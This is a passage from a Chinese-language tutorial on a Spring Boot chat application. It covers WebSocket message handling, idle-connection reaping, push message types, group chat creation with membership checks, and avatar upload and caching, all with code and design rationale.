
            messageService.sendMessage(userId, request.getSessionId(),
                    request.getContent(), request.getContentType());

        } catch (UserException e) {
            // 🔴 业务校验失败（不是会话成员、内容为空……）只回给发送者，连接不能断
            log.warn("WebSocket 消息处理失败：userId = {}, 原因 = {}", userId, e.getMessage());
            onlineUserManager.sendTo(userId, WsMessageResponse.ofError(e.getMessage()));
        } catch (Exception e) {
            log.error("WebSocket 消息处理异常：userId = " + userId, e);
            onlineUserManager.sendTo(userId, WsMessageResponse.ofError("消息发送失败，请稍后重试"));
        }
    }

    @Override
    public void afterConnectionClosed(WebSocketSession session, CloseStatus status) {
        Integer userId = currentUserId(session);
        if (userId != null) {
            onlineUserManager.remove(userId, session);
        }
        log.info("WebSocket 已断开：userId = {}, status = {}", userId, status);
    }

    @Override
    public void handleTransportError(WebSocketSession session, Throwable exception) {
        log.warn("WebSocket 传输异常：{}", exception.getMessage());
    }

    private Integer currentUserId(WebSocketSession session) {
        return (Integer) session.getAttributes().get(Constant.CURRENT_USER_ID);
    }
}
```

**三个设计细节**：

1. **`touch()` 放在方法第一行**。它是空闲回收唯一的"活着"信号。如果放在"指令校验"之后，
   那些不认识的指令就不会刷新活跃时间 —— 而客户端恰好只发两种（心跳、消息），
   所以现在这样最稳：**任何一帧都算活着**。

2. **业务异常回 `type:"error"` 推送，而不是断连**。
   一次"你不在这个会话里"或者"内容太长了"就把用户的连接掐掉，用户会觉得"聊天室又崩了"。
   **错误可以恢复，连接不该因此受损。**

3. **心跳不打日志**。一个在线用户每分钟两条心跳，几十个人在线就是每分钟上百行日志 ——
   真出问题时反而找不到关键的那几行。

### 10.5 空闲连接回收：一个静默失效的官方开关

#### 问题：拔网线的人永远"在线"

```java
session.close(CloseStatus.GOING_AWAY);
```

上面这条只在**收到连接关闭事件**时才执行。而下面这些情况**根本不会触发** `afterConnectionClosed`：

- 用户拔网线 / 关掉路由器
- 笔记本合盖休眠
- 手机从 WiFi 走到 4G（IP 变了，但 TCP 连接只是安静地断掉）

因为**TCP 连 FIN 都收不到**。后果非常严重：

| 后果 | 说明 |
|---|---|
| 内存只涨不降 | `onlineSessions` 里堆积永远不会被清理的 session |
| `isOnline()` 撒谎 | 业务代码以为对方在线，推送全打到空气上 |
| 前端也不一定发现 | 客户端有自己的心跳检测，但**服务端这条老连接还在** |

⚠️ **靠客户端重连治不了**：客户端重连开的是**新连接**，老的那条还在服务端挂着。

#### 官方做法为什么不行（实测记录）

标准做法是设置容器的空闲超时：

```java
// ❌ 实测在 Spring Boot 3 + 内嵌 Tomcat 下【静默失效】
@Bean
public ServletServerContainerFactoryBean createWebSocketContainer() {
    ServletServerContainerFactoryBean container = new ServletServerContainerFactoryBean();
    container.setMaxSessionIdleTimeout(4000L);
    return container;
}
```

**实测结果**：值确实设进去了（启动日志能看到"设置后读回 4000 ms"），
但**连接静置 6.5 秒依然活着** —— 因为 Spring 的 `WebSocketConfigurer` 握手路径
**不会把容器的 defaultMaxSessionIdleTimeout 落到 session 上**。

> 这类"值设进去了、就是不生效"的配置最耗时间：日志显示正常，行为完全不符。
> **所以我选择自己扫 —— 行为确定，而且能测。**

#### 自研回收器

```java
@Slf4j
@Component
public class WebSocketIdleReaper {

    private final OnlineUserManager onlineUserManager;

    /**
     * 多久没收到任何帧就算这条连接死了。
     * 必须明显大于客户端心跳间隔（client.js 的 WS_HEARTBEAT_MS = 25s）——
     * 至少要能容忍两三次心跳丢失（网络抖动、GC 停顿），否则会把好连接误杀。
     * 120s ≈ 4 个心跳周期。
     */
    @Value("${websocket.session-idle-timeout-ms:120000}")
    private long idleTimeoutMs;

    public WebSocketIdleReaper(OnlineUserManager onlineUserManager) {
        this.onlineUserManager = onlineUserManager;
    }

    /**
     * 扫描周期。用 fixedDelay 而不是 fixedRate：
     * fixedRate 会在上一轮没跑完时堆叠执行，而这里每一轮都可能去关连接（有 IO），本该一轮一轮来。
     */
    @Scheduled(fixedDelayString = "${websocket.reap-interval-ms:30000}")
    public void reapIdleSessions() {
        int closed = onlineUserManager.closeIdleSessions(idleTimeoutMs);
        if (closed > 0) {
            log.info("WebSocket 空闲回收：关闭 {} 条无响应连接，剩余在线连接 {}",
                    closed, onlineUserManager.sessionCount());
        }
    }
}
```

对应 `OnlineUserManager` 里的扫描：

```java
    public int closeIdleSessions(long timeoutMs) {
        if (timeoutMs <= 0) return 0;        // 0 = 不回收
        long deadline = System.currentTimeMillis() - timeoutMs;
        int closed = 0;

        // 遍历时先复制一份 key 和 set，避免和并发的 add/remove 互相打扰
        for (Map.Entry<Integer, Set<WebSocketSession>> entry : new ArrayList<>(onlineSessions.entrySet())) {
            Integer userId = entry.getKey();
            for (WebSocketSession session : new ArrayList<>(entry.getValue())) {
                if (lastActiveAt(session) >= deadline) continue;
                log.info("回收空闲连接：userId = {}, sessionId = {}", userId, session.getId());
                try {
                    session.close(CloseStatus.GOING_AWAY);
                } catch (Exception e) {
                    log.warn("关闭空闲连接失败：userId = {}, 原因 = {}", userId, e.getMessage());
                }
                // 兜底：close() 正常会触发 afterConnectionClosed -> remove()，
                // 但如果那条回调没来，这里也得把它从在线表里摘掉，否则"回收"就成了空话。
                // 先判一下还在不在，免得和回调里那次 remove 一起打出两条"用户下线"的日志
                if (isTracked(userId, session)) {
                    remove(userId, session);
                }
                closed++;
            }
        }
        return closed;
    }
```

**怎么验证它真的生效**（这一条很实用）：

```yaml
# 临时把两个值都调小
websocket:
  session-idle-timeout-ms: 4000
  reap-interval-ms: 2000
```

连上一条 WS 之后什么都不发，**7 秒内服务端就会把它关掉**，日志里能看到 `回收空闲连接：userId = ...`。
验证完记得改回 120000 / 30000。

### 10.6 推送信封：一个类装下 7 种推送

```java
/**
 * WebSocket 推送统一信封。各种推送共用一个类，靠 type 区分，
 * 前端 client.js 的 onmessage 就是按 resp.type 分发的。
 *
 * 挂 @JsonInclude(NON_NULL) 把用不上的字段省掉 —— 这里安全，因为它【是纯返回体，不是表实体】。
 */
@Data
@JsonInclude(JsonInclude.Include.NON_NULL)
public class WsMessageResponse {
    private String type;

    // ===== type = message =====
    private Integer messageId;
    private Integer fromId;
    private String fromName;
    private Integer sessionId;
    private String content;
    /** 1 文本 / 2 图片。不能省！省了接收方会把图片路径当文本显示 */
    private Integer contentType;
    @JsonFormat(pattern = "yyyy-MM-dd HH:mm:ss")
    private LocalDateTime postTime;

    /**
     * 接收者此刻的未读条数。
     * 只对"非发送者"填；发送者自己那条不带这个字段（NON_NULL 会省掉），
     * 前端用 resp.unreadCount != null 来判断要不要更新红点。
     *
     * 由后端给权威值而不是让前端 +1：前端自己加会在
     * 页面刚刷新、消息撤回、多标签页同时在线等情况下算错。
     */
    private Integer unreadCount;

    // ===== type = addFriendRequest =====
    private Integer fromUserId;
    private String fromUserName;
    private String reason;

    // ===== type = groupCreated =====
    private String groupName;

    // 静态工厂方法见下文
}
```

**推送类型清单**（前端按 `type` 分发）：

| type | 什么时候推 | 关键字段 |
|---|---|---|
| `message` | 有人发了消息（含自己发的） | `sessionId` / `fromName` / `content` / `contentType` / `postTime` / `unreadCount` |
| `addFriendRequest` | 别人加你好友 | `fromUserId` / `fromUserName` / `reason` |
| `acceptFriend` | 别人通过了你的好友申请 | `fromUserName` |
| `revoke` | 某条消息被撤回（含自己撤的） | `messageId` / `sessionId` / `fromId` / `fromName` |
| `groupCreated` | 你被拉进了一个群 | `groupName` |
| `pong` | 心跳应答 | 只有 `type` |
| `error` | 你发来的 WS 请求没处理成功 | `content`（当错误文案用） |

**几个工厂方法里的设计考虑**：

```java
    /** 借用 content 字段当错误文案，前端 resp.type === 'error' 时 alert(resp.content) */
    public static WsMessageResponse ofError(String content) {
        WsMessageResponse resp = new WsMessageResponse();
        resp.setType(Constant.WS_TYPE_ERROR);
        resp.setContent(content);
        return resp;
    }

    /**
     * 撤回通知。带 fromId 是为了让前端判断"是不是我撤的"——
     * 光比 fromName 在群聊里不够稳：用户名虽有唯一约束，但前端拿到的 selfUsername
     * 是页面初始化时的快照。
     */
    public static WsMessageResponse ofRevoke(Integer messageId, Integer sessionId,
                                             Integer fromId, String fromName) { ... }

    /**
     * 你被拉进了一个群（新建群拉人 / 往已有群加人，两种情况共用这一条推送）。
     * 不推 sessionId：被拉的人此刻本地还没有这个会话，前端收到后统一重新拉一次 /sessionList，
     * 比在推送里塞一堆会话信息再让前端手工拼装可靠得多
     * （拼接要处理 unreadCount、成员列表、lastMessage 一堆字段，很容易拼错）。
     */
    public static WsMessageResponse ofGroupCreated(String groupName) { ... }
```

> **`ofGroupCreated` 那条注释值得单独记：**"推送里只给 ID/名字，让前端重新拉一次列表"
> 比"在推送里塞完整对象"**更可靠** —— 因为推送里的数据是**某一刻的快照**，
> 而列表接口给的是**当前真相**。后者永远不会让前端显示出一个不存在或者字段缺失的会话。

### 10.7 前端侧（只讲和后端有契约的部分）

```javascript
const WS_HEARTBEAT_MS      = 25 * 1000;      // 每 25s 发一次 ping
const WS_PONG_TIMEOUT_MS   = 60 * 1000;      // 超过 60s 没收到服务端任何帧 → 判定连接已死
const WS_RECONNECT_BASE_MS = 1000;           // 首次重连等 1s
const WS_RECONNECT_MAX_MS  = 30 * 1000;      // 指数退避上限 30s

function buildWsUrl() {
    // 改 HTTPS 时 WS 自动跟着走 WSS —— 部署时不用改代码
    const proto = location.protocol === 'https:' ? 'wss://' : 'ws://';
    return proto + location.host + '/ws/message?token=' + encodeURIComponent(token);
}
```

**四件必须做的事**：

| 事情 | 为什么 |
|---|---|
| **应用层心跳（25s）** | 浏览器不给 ping API，拿不到底层帧。心跳既给中间代理"持续喂数据"（很多代理 60s 无流量就掐），**也让客户端能发现"TCP 还连着、对面其实早不响应"的半开连接** |
| **60s 没收到任何帧就主动断开重连** | 半开连接在客户端侧表现为"发得出去、收不到回复"。主动断开比傻等快得多 |
| **指数退避重连（1s → 30s）** | 服务器重启时，几百个客户端每秒重连一次就是一次小型 DDoS。退避能把压力摊平 |
| **重连成功后必须补拉** | 断线期间的消息不会自动出现在界面上。要重新拉：会话列表 + 当前会话历史 + 好友申请 |

**还有一个坑：`initWebSocket()` 必须幂等。**
它可能被多个入口调用（登录成功、重连成功、切换会话），不幂等就会开出多条连接 ——
表现是**发一条消息，界面上出现两条**（因为两条连接都收到了服务端推送）。

---

## 第 11 章 · 六个扩展功能（课件只给了需求，这里是实现）

课件第 74–75 页的附录「功能扩展」列了这么几项：

> 头像 / 群聊 / 未读提示 / 图片-表情 / 消息搜索 / 消息撤回（2min 内）+ 「更多功能自行参考网页微信」

**但课件只写了需求描述，一行实现代码都没给。** 这一章就是把这 6 项补完。

先给一张总览，让你知道每项大概要动多少东西：

| 功能 | 数据库改动 | 后端新增 | 难度 | 真正的难点在哪 |
|---|---|---|---|---|
| 群聊 | `message_session` 加 2 列 | 3 个方法 | ★★★ | 会话列表的"多行合并"与权限校验 |
| 头像 | **零改动** | 1 个接口 + 2 个方法 | ★★ | 换头像的顺序、浏览器缓存 |
| 未读提示 | `message_session_user` 加 1 列 | 2 条 SQL | ★★★ | 游标法（第 8 章已详解） |
| 图片消息 | `message` 加 1 列 | 1 个接口 | ★★ | 上传与发送拆两步 |
| 消息搜索 | 无 | 1 条 SQL | ★★ | 权限隔离靠 join 不靠 where |
| 消息撤回 | `message` 加 1 列 | 2 个方法 | ★★★ | 时间窗口 + 并发两道闸 |

> 先说一个结论，后面每一项都印证它：**这个项目里最难的从来不是"写代码"，而是"想清楚边界条件"。**
> 六个功能加起来不到 400 行代码，但每一个都藏着一到两个"不这么写就出 bug"的点。

---

### 11.1 群聊：不需要新建群成员表

这是整章最值得讲的一节。

#### 11.1.1 先想清楚：到底要不要建 `group_member` 表

很多教程一讲群聊就让你建两张表：

```sql
-- 常见的做法（本项目没有这么做）
create table `group`        (group_id, name, owner_id, ...);
create table `group_member` (group_id, user_id, ...);
```

看起来天经地义，但**回到我们第 2 章的 `message_session_user` 表看看它长什么样**：

```sql
create table message_session_user (
    session_id           int         not null,
    user_id              int         not null,
    last_read_message_id int         not null default 0,
    primary key (session_id, user_id)
);
```

这是 `(session_id, user_id)` 的**多对多**关系表 ——

- 单聊时，一个 session 挂 2 行
- 群聊时，一个 session 挂 N 行

**结构上一模一样。** 换句话说：**这张表本来就是为群聊预留的**，单聊只是"成员数为 2"的特例。

所以群聊真正需要的数据库改动只有两个字段：

```sql
alter table message_session
    add column type tinyint     not null default 1 comment '1 单聊 / 2 群聊',
    add column name varchar(64)          null     comment '群名称，单聊为 NULL';
```

然后 `message_session_user` **一行都不用动**。

> **这一点在面试里非常好用。** 被问"你群聊怎么设计的"，回答：
> "我把单聊和群聊统一抽象成'会话'——`message_session` 是会话本身，`message_session_user` 是会话成员。
> 单聊就是成员数为 2 的会话，群聊就是成员数为 N 的会话。所以加群聊只加了两个字段，
> 成员关系完全复用。" 这比"我建了个 group_member 表"听起来对设计理解深得多。

#### 11.1.2 `createGroup`：建群

```java
@Override
@Transactional(rollbackFor = Exception.class)
public SessionCreateResponse createGroup(Integer creatorId, String name, List<Integer> memberIds) {
    // ① 群名校验
    if (!StringUtils.hasText(name)) {
        throw new UserException("群名称不能为空");
    }
    String groupName = name.trim();
    if (groupName.length() > MAX_GROUP_NAME_LENGTH) {       // 64，和列宽对齐
        throw new UserException("群名称最多 " + MAX_GROUP_NAME_LENGTH + " 个字");
    }

    // ② 成员去重 + 去掉自己
    //    LinkedHashSet：既去重，又保持前端选择的顺序（便于日志排查）
    Set<Integer> members = new LinkedHashSet<>();
    if (memberIds != null) {
        for (Integer id : memberIds) {
            if (id != null && !id.equals(creatorId)) {
                members.add(id);
            }
        }
    }
    if (members.isEmpty()) {
        throw new UserException("至少要选择一位好友");
    }

    // ③ 🔴 关键校验：只能拉自己的好友进群
    for (Integer id : members) {
        if (!isFriend(creatorId, id)) {
            throw new UserException("只能拉自己的好友进群");
        }
    }

    // ④ 1 行会话 + (1 + N) 行成员，必须同一事务
    MessageSession session = new MessageSession();
    session.setType(Constant.SESSION_TYPE_GROUP);   // 2
    session.setName(groupName);
    session.setLastTime(LocalDateTime.now());
    sessionMapper.insert(session);

    Integer sessionId = session.getSessionId();     // MP 回填自增主键
    sessionUserMapper.insert(new MessageSessionUser(sessionId, creatorId, 0));
    for (Integer id : members) {
        sessionUserMapper.insert(new MessageSessionUser(sessionId, id, 0));
    }

    // ⑤ 通知被拉进来的人 —— 但要等事务提交之后再推
    WsMessageResponse push = WsMessageResponse.ofGroupCreated(groupName);
    TxAfterCommit.run(() -> {
        for (Integer id : members) {
            onlineUserManager.sendTo(id, push);
        }
    });

    log.info("新建群聊：sessionId = {}, name = {}, 创建者 = {}, 成员 = {}",
            sessionId, groupName, creatorId, members);
    return new SessionCreateResponse(sessionId);
}
```

**四个值得展开的点：**

**① 第 ③ 步为什么是"关键校验"？**

不校验的后果：前端 `POST /group?name=x&memberIds=999&memberIds=998`，随手填两个 userId，**陌生人就被拉进群了**。

而群消息广播是**发给会话内所有成员**的 —— 等于你把两个陌生人拉进群，他们**能读到之前所有的历史消息**（因为 `/message?sessionId=` 只校验"我在这个会话里"）。

这是本项目里**同类型的第二个漏洞**（第一个是 `acceptFriend`，见 7.3 节）。它们的共同点：

> **只要一个接口能"往某个集合里塞人"，就必须校验"你有没有资格塞这个人"。**

**② 为什么 `memberIds` 用 `LinkedHashSet` 而不是 `List` 或 `HashSet`？**

- 用 `List` → 前端重复传 `memberIds=4&memberIds=4`，就会插两行 `(sessionId, 4)` → **联合主键冲突，整个事务回滚**
- 用 `HashSet` → 能去重，但顺序乱了
- 用 `LinkedHashSet` → 去重 + 保序，两个问题都没有

**③ 为什么推送要放进 `TxAfterCommit`？**

这是第 4.7 章那个工具类的第一次实战。

假设不用它，直接推：

```java
// ❌ 错的写法
for (Integer id : members) {
    onlineUserManager.sendTo(id, push);   // 事务还没提交！
}
```

被拉的人**秒收到**推送，前端一刷新会话列表 —— **发现没有这个群**（因为事务还没提交，别的连接读不到）。

对方的反应是"程序坏了"，然后反复刷新，等事务真提交了他反而不刷了。

**推送是"给外界看的副作用"，必须在数据真正落地之后发生。** 这就是 `TxAfterCommit` 的存在意义。

**④ `@Transactional(rollbackFor = Exception.class)` 为什么不能省？**

1 行会话 + N+1 行成员，一共 N+2 次 insert。中途失败（比如磁盘满、连接断）必须全部回滚，否则会留下"有会话但没成员"或者"有 3 个成员但应该是 4 个"的脏数据。

> ⚠️ `rollbackFor = Exception.class` 这个参数**必须写**。Spring 默认只对 `RuntimeException` 和 `Error` 回滚，**受检异常不回滚**。
> 本项目抛的都是 `UserException`（RuntimeException 子类）所以侥幸没事，但写成显式的最稳。

#### 11.1.3 `quitGroup`：退群（顺便讲一个"要不要删数据"的决策）

```java
@Override
@Transactional(rollbackFor = Exception.class)
public void quitGroup(Integer userId, Integer sessionId) {
    if (sessionId == null) {
        throw new UserException("会话 id 不能为空");
    }
    requireGroup(sessionId);                    // 断言：会话存在且是群聊
    if (!isMember(userId, sessionId)) {
        throw new UserException("你不在这个群里");
    }

    // 删掉我这一行成员关系
    LambdaQueryWrapper<MessageSessionUser> wrapper = new LambdaQueryWrapper<>();
    wrapper.eq(MessageSessionUser::getSessionId, sessionId)
            .eq(MessageSessionUser::getUserId, userId);
    sessionUserMapper.delete(wrapper);

    // 最后一个人退群 → 把会话本身也删掉
    long left = countMembers(sessionId);
    if (left == 0) {
        sessionMapper.deleteById(sessionId);
        log.info("群已空，删除会话：sessionId = {}", sessionId);
    }
}
```

**这里有两个决策值得写进面试答案：**

**决策 1：最后一个人退群时删不删会话？**

删。理由：不删的话，`message_session` 里会留下一堆**谁也访问不到的空壳**（没有任何成员）。它们会：
- 永远占据自增 id 空间
- 让任何"全表扫 message_session"的运维查询看到一堆僵尸数据

**决策 2：消息记录删不删？**

**不删。** `message` 表里那些消息原样留着。

理由：
1. 群里其他人可能还有这个会话（不是最后一个人退的情况），删消息会把他们那边的历史消息**删空**
2. 消息是"已经发生过的事实"，属于**审计数据**，清理它是另一个明确的运维动作，不该混在"退群"这个动作里顺手做掉

> **面试话术**："退群我只删成员关系。最后一个人退时删掉空会话，但消息不删 ——
> 消息是审计数据，清理它应该是独立的运维动作，不该藏在业务动作里。"

#### 11.1.4 Controller：注意那个数组参数

```java
/**
 * 建群。参数：name=群名&memberIds=4&memberIds=5
 *
 * @param memberIds 只放"别人"，创建者由后端从 token 里取、自动入群
 */
@PostMapping("/group")
public SessionCreateResponse createGroup(HttpServletRequest request,
                                         String name,
                                         @RequestParam(required = false) List<Integer> memberIds) {
    return sessionService.createGroup(currentUserId(request), name, memberIds);
}

/** 往群里加人。参数：sessionId=3&newMemberId=5 */
@PostMapping("/groupMember")
public void addGroupMember(HttpServletRequest request, Integer sessionId, Integer newMemberId) {
    sessionService.addGroupMember(currentUserId(request), sessionId, newMemberId);
}

/** 退群。参数：sessionId=3 */
@PostMapping("/quitGroup")
public void quitGroup(HttpServletRequest request, Integer sessionId) {
    sessionService.quitGroup(currentUserId(request), sessionId);
}
```

**两个容易卡住的细节：**

**① `POST` + 参数挂在 URL query 上，所以千万别加 `@RequestBody`。**

这是本项目贯穿始终的风格约定（见 0.3 节的对照表）—— 因为前端 `client.js` 就是这么调的。加上 `@RequestBody` 会直接报 `415 Unsupported Media Type`。

**② 数组参数用"重复参数名"，不用 `memberIds[]`。**

前端发的是：

```javascript
$.ajax({ type: 'post', url: '/group', data: { name: '家庭群', memberIds: [4, 5] } });
```

jQuery 序列化出来是 `name=家庭群&memberIds=4&memberIds=5`。

Spring MVC **默认就能绑到 `List<Integer>`** —— 只要参数名是重复的，它会自动收集成一个 List。不需要 `@RequestParam("memberIds[]")`，也不需要 `@RequestBody`。

> 这是 Spring MVC 一个很好用但很少被讲到的行为。它和 `?ids=1,2,3`（逗号分隔）是两条不同的路 ——
> **逗号分割需要配 `StringToCollectionConverter` 的规则，重复参数名是开箱即用的**。前端用哪种，后端不用改代码。

#### 11.1.5 群聊在会话列表里为什么会"多出几行"

这是群聊带来的**最隐蔽的一个 bug**。

回头看第 8 章的 `selectSessionList` —— 它为了拿到"对方的信息"，join 了这么一段：

```sql
-- 群聊时，这里会 join 出「成员数 - 1」行
left join message_session_user msu_other
       on msu_other.session_id = ms.session_id
      and msu_other.user_id   <> #{userId}
 left join user u_other on u_other.user_id = msu_other.user_id
```

单聊时这个 join 出 1 行（对方）；**群聊时出 N-1 行**（除了我之外的每个成员各 1 行）。

而 SQL 是 `order by ms.last_time desc` 排好的。所以群聊的 **N-1 行是连续出现的**。

Java 侧的处理就是第 8.2 章那个 `LinkedHashMap`：

```java
Map<Integer, SessionListResponse> grouped = new LinkedHashMap<>();
for (SessionRow row : rows) {
    SessionListResponse item = grouped.computeIfAbsent(row.getSessionId(), id -> { /* 建空壳 */ });
    if (row.getFriendId() != null) {          // ← 这个判空不能少
        item.getFriends().add(new Friend(row.getFriendId(), row.getFriendName()));
    }
}
return new ArrayList<>(grouped.values());
```

**`if (row.getFriendId() != null)` 这个判空为什么不能少？**

因为那个 `other` join 是 **`left join`**。

场景：一个群里其他人都退光了，只剩我一个人。这时 `msu_other` 查询无行 → 整个 join 结果为 null → **`friendId` 是 null**。

- 如果是 `inner join` → **这个群整行都查不出来**，我的会话列表里这个群直接消失了（明明我还在群里！）
- 是 `left join` 且判空 → 这个群还在列表里，只是"成员列表"是空的

**这就是为什么 8.1 节特意强调 `other` join 必须是 `left join`。**

#### 11.1.6 顺带一个坑：`findCommonSession` 必须加 `type = 1`

`findCommonSession` 是用来判断"我和他之间有没有已有的单聊会话"的：

```sql
-- 🔴 where 里这个 ms.type = 1 绝对不能少
select ms.session_id
  from message_session ms
  join message_session_user a on a.session_id = ms.session_id and a.user_id = #{selfUserId}
  join message_session_user b on b.session_id = ms.session_id and b.user_id = #{toUserId}
 where ms.type = 1
 limit 1
```

**少了 `ms.type = 1` 会怎样？**

如果我和 `xiaodudu` 在**同一个群里**，那这个查询会匹配到那个群（因为我们俩都是成员），然后**返回群的 sessionId**。

于是 `POST /session?toUserId=5` 的结果是"复用了一个群聊会话" —— 你会被塞进一个群里发私聊消息。

> 这个 bug 的症状是"点好友发起私聊，结果进了群聊"。**排查时根本不会想到是这条 SQL 少了条件** ——
> 因为从业务上说"查询我俩的共同会话"听起来完全合理，只是忘了"共同会话"分单聊和群聊两种。
>
> 教训：**凡是"查一个东西"的 SQL，都要问自己"这个条件能唯一定位我要的那种东西吗"。**

---

### 11.2 头像：零字段改动

#### 11.2.1 设计决策：为什么不在接口里加 `avatarUrl` 字段

最直觉的做法是：给 `/userInfo`、`/friendList`、`/sessionList`、以及每次消息推送，都加一个 `avatarUrl` 字段。

**但这个项目一个都没加。** 而是做了一个独立的接口：

```
GET /avatar/{userId}
```

前端只要有 userId，就能拼出 `/avatar/4`。

**为什么这么设计？**

| 方案 | 代价 |
|---|---|
| 在每个接口里塞 `avatarUrl` | ① 4 个接口的 SQL 全要改（都要 join user 表取 avatar）<br>② 消息推送也要带（否则对方头像显示不出来）→ 推送体积变大<br>③ 头像变了，所有已发出的推送里那些 URL 都过期了 |
| 独立 `GET /avatar/{userId}` | ① 一个接口搞定所有场景<br>② **零 SQL 改动**<br>③ 头像变了，前端加个时间戳参数强制刷新即可（URL 本身没变） |

**这就是"关注点分离"在接口设计上的体现**：头像的**获取**是独立的一件事，不该成为每个接口的附加字段。

#### 11.2.2 `AvatarController`

```java
@Slf4j
@RestController
public class AvatarController {

    private final UserService userService;

    public AvatarController(UserService userService) {
        this.userService = userService;
    }

    @GetMapping("/avatar/{userId}")
    public ResponseEntity<Resource> getAvatar(@PathVariable Integer userId) {
        Resource resource = userService.loadAvatar(userId);
        if (resource == null) {
            // 前端 <img onerror> 会收到这个 404，回退成首字母色块头像
            return ResponseEntity.notFound().build();
        }

        MediaType mediaType = MediaTypeFactory.getMediaType(resource)
                .orElse(MediaType.APPLICATION_OCTET_STREAM);

        return ResponseEntity.ok()
                .contentType(mediaType)
                // 换头像后 URL 还是 /avatar/4，不禁缓存的话浏览器会一直显示旧图。
                // no-cache 不是"不缓存"，而是"每次先跟服务端确认"，不新鲜才重新下载。
                .cacheControl(CacheControl.noCache())
                .body(resource);
    }
}
```

**三个细节：**

**① 🔴 这个接口必须在 `WebConfig` 里放行。**

理由：`<img src="/avatar/4">` 是**浏览器原生请求**，它带不了 `User-Token` 请求头。不放行的话，登录拦截器会给每个头像请求返回 401，页面上一排破图。

```java
// WebConfig 的放行清单里
.excludePathPatterns(
        "/user/login", "/user/register",
        "/avatar/**",          // ← 头像：<img> 带不了请求头
        "/upload/**",          // ← 聊天图片，同理
        "/ws/**",              // ← WebSocket 握手
        "/error",              // ← 异常转发（不加会被再拦一次，401 盖掉真实错误）
        "/login.html", "/register.html", "/client.html",
        "/css/**", "/js/**", "/img/**", "/favicon.ico"
);
```

**只放行"读"，上传照样要登录** —— `POST /user/avatar` 不在放行清单里，所以换头像必须带 token。

**② `MediaTypeFactory.getMediaType(resource)` 会自动根据扩展名推断 MIME 类型**（`.png` → `image/png`）。

不用手工写 if-else。推断不出来时兜底 `application/octet-stream`（浏览器会提示下载而不是显示，属于"能接受的最差情况"）。

**③ `CacheControl.noCache()` 的作用是"允许缓存但每次都要跟服务端确认"。**

很多人以为 `no-cache` 是"不缓存"，其实不是 —— `no-store` 才是"完全不缓存"。

用 `no-cache` 的话：浏览器每次都会发一个带 `If-None-Match` 的请求，服务端比对 ETag 没变就返 `304 Not Modified`（**不重传图片本体**，省流量），变了才重传。

所以它既解决了"换头像后看到旧图"，又没牺牲缓存带来的性能。

#### 11.2.3 `updateAvatar`：三步顺序很重要

```java
@Override
public String updateAvatar(Integer userId, MultipartFile file) {
    User user = userMapper.selectById(userId);
    if (user == null) {
        throw new UserException("用户不存在");
    }

    // 第 1 步：先把新文件存到磁盘
    String url = fileStorageService.saveImage(file, Constant.AVATAR_DIR, userId);

    // 第 2 步：只更新 avatar 一个字段
    //     MP 的 updateById 只把非 null 字段拼进 SQL，
    //     所以不会被 password / user_name 覆盖（前提是这里别手贱去 set 它们）
    User update = new User();
    update.setUserId(userId);
    update.setAvatar(url);
    userMapper.updateById(update);

    // 第 3 步：最后才删旧头像
    fileStorageService.deleteQuietly(user.getAvatar());

    log.info("头像已更新：userId = {}, url = {}", userId, url);
    return url;
}
```

**为什么必须是"存新 → 更新 DB → 删旧"这个顺序？**

把三种顺序列出来对比，一眼就能看出：

| 顺序 | 中途失败会怎样 |
|---|---|
| 删旧 → 存新 → 更新 DB | ❌ **最差**：旧的删了、新的没存上 → 用户头像直接没了，且 DB 里还指着一个不存在的文件 |
| 存新 → 删旧 → 更新 DB | ⚠️ 旧的删了、DB 还没更新 → DB 指向旧文件（已删）→ 破图 |
| **存新 → 更新 DB → 删旧** | ✅ 最差情况只是"多了一个永远没人访问的孤儿文件"，功能完全正常 |

**核心原则：把"不可逆的破坏操作"放在最后一步。** 删文件是不可逆的，所以放最后。

**另一个细节：第 2 步那个"只 set 两个字段"的写法。**

```java
User update = new User();
update.setUserId(userId);
update.setAvatar(url);
userMapper.updateById(update);
```

这样拼出来的 SQL 是：

```sql
update user set avatar = '/upload/avatar/4_xxx.png' where user_id = 4
```

**只更新 avatar 一列。**

如果偷懒写成 `userMapper.updateById(user)`（直接传第 1 步查出来的完整 user），MP 会把所有非 null 字段都拼进去 —— 包括 `password`（64 位密文）和 `user_name`。

**这次没坏（因为值没变），但下次你在这两行中间改了 `user` 对象的某个字段，就会莫名其妙被写回数据库。**

> 这是 MP 的 `updateById` 一个很典型的"陷阱式便利"：它只更新非 null 字段，看起来安全；
> 但只要你传的是"从数据库查出来的完整对象"，就等于"全字段覆盖"。

#### 11.2.4 `loadAvatar` + 一个"删不掉也不该报错"的决策

```java
@Override
public Resource loadAvatar(Integer userId) {
    User user = userMapper.selectById(userId);
    if (user == null || user.getAvatar() == null) {
        return null;      // → AvatarController 返 404 → 前端回退成首字母色块
    }
    return fileStorageService.loadAsResource(user.getAvatar());
}
```

`deleteQuietly` 的"quietly"是刻意的：

```java
@Override
public void deleteQuietly(String url) {
    Path path = resolve(url);
    if (path == null) {
        return;
    }
    try {
        Files.deleteIfExists(path);
    } catch (IOException e) {
        // 删不掉就算了：留下一个孤儿文件，不影响功能，不该因此让"换头像"整个失败
        log.warn("删除旧文件失败：{}，原因 = {}", path, e.getMessage());
    }
}
```

**这是一个"失败降级"的设计决策。**

删旧头像失败（文件被别的进程占着、权限不对）会产生什么后果？**一个 20KB 的孤儿文件。**

而如果这里抛异常，后果是什么？**用户换头像失败，而且新头像明明已经存好、DB 也更新了** —— 用户会看到"上传失败"的提示，但刷新一下头像其实是新的。这个体验比"多一个孤儿文件"糟糕得多。

> **判断标准：一个副作用失败后，它的后果是否影响主流程？**
> 不影响 → 记日志、吞掉、继续。
> 影响 → 抛异常、回滚。

#### 11.2.5 前端那两处必须做的事

**① 首字母色块 + `<img>` 叠加，`onerror` 删图**

```html
<div class="avatar">
    <span class="avatar-letter">W</span>            <!-- 底色 + 首字母，永远在下面 -->
    <img src="/avatar/4" onerror="this.remove()">   <!-- 有头像就盖住，404 就自己消失 -->
</div>
```

好处：**没有头像的用户也有一个好看的色块**，而不是默认的破图 icon。而且**不用先发请求判断有没有头像** —— 让它自己去 404 就行了。

**② 换头像成功后，前端要"强制重新下载"**

```javascript
success: function() {
    // 头像 URL 还是 /avatar/4 没变，浏览器可能拿缓存里的旧图。
    // 所以带个时间戳参数强制重新下载，并把界面上所有自己的头像一起刷新。
    refreshAvatars(selfUserId);
}
```

`refreshAvatars` 内部会把所有指向该 userId 的 `<img>` 的 src 改写成 `/avatar/4?t=<Date.now()>`。

**注意这是双保险**：后端 `no-cache` 已经能保证浏览器会来问一次；前端加时间戳是"连 304 都不等，直接重新下"。

